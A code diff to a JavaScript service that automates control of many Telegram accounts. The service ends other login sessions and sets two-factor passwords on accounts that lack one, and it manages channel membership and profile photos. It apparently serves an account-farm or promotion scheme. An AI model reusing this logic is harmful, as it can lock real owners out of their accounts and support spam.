@@ -32,6 +32,8 @@ const connection_manager_1 = require("../Telegram/utils/connection-manager");
 const session_manager_1 = require("../session-manager");
 const utils_1 = require("../../utils");
 const channelinfo_1 = require("../../utils/telegram-utils/channelinfo");
+const getProfilePics_1 = require("../Telegram/utils/getProfilePics");
+const deleteProfilePics_1 = require("../Telegram/utils/deleteProfilePics");
 let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
     constructor(promoteClientModel, telegramService, usersService, activeChannelsService, clientService, channelsService, bufferClientService, sessionService) {
         this.promoteClientModel = promoteClientModel;
@@ -298,7 +300,14 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
                     await (0, Helpers_1.sleep)(2000);
                     const channels = await (0, channelinfo_1.channelInfo)(client.client, true);
                     this.logger.debug(`${mobile}: Found ${channels.ids.length} existing channels`);
+                    await (0, Helpers_1.sleep)(2000);
                     await this.update(mobile, { channels: channels.ids.length });
+                    if (channels.ids.length > 100) {
+                        const profilePics = await (0, getProfilePics_1.getProfilePics)(client.client);
+                        if (profilePics.length > 0) {
+                            await (0, deleteProfilePics_1.deleteProfilePhotos)(client.client, profilePics);
+                        }
+                    }
                     if (channels.canSendFalseCount < 10) {
                         const excludedIds = channels.ids;
                         const channelLimit = 150;
@@ -860,16 +869,10 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
                     this.logger.debug(`hasPassword for ${document.mobile}: ${hasPassword}`);
                     if (!hasPassword) {
                         await client.removeOtherAuths();
+                        await (0, Helpers_1.sleep)(10000);
                         await client.set2fa();
                         this.logger.debug('Waiting for setting 2FA');
                         await (0, Helpers_1.sleep)(30000);
-                        await client.updateUsername('');
-                        await (0, Helpers_1.sleep)(3000);
-                        await client.updatePrivacyforDeletedAccount();
-                        await (0, Helpers_1.sleep)(3000);
-                        await client.updateProfile('Deleted Account', 'Deleted Account');
-                        await (0, Helpers_1.sleep)(3000);
-                        await client.deleteProfilePhotos();
                         const channels = await (0, channelinfo_1.channelInfo)(client.client, true);
                         this.logger.debug(`Inserting Document for client ${targetClientId}`);
                         const promoteClient = {
@@ -892,9 +895,6 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
                         catch (userUpdateError) {
                             this.logger.warn(`Failed to update user 2FA status for ${document.mobile}:`, userUpdateError);
                         }
-                        await this.sessionService.getOldestSessionOrCreate({
-                            mobile: document.mobile
-                        });
                         this.logger.log(`=============Created PromoteClient for ${targetClientId}==============`);
                     }
                     else {
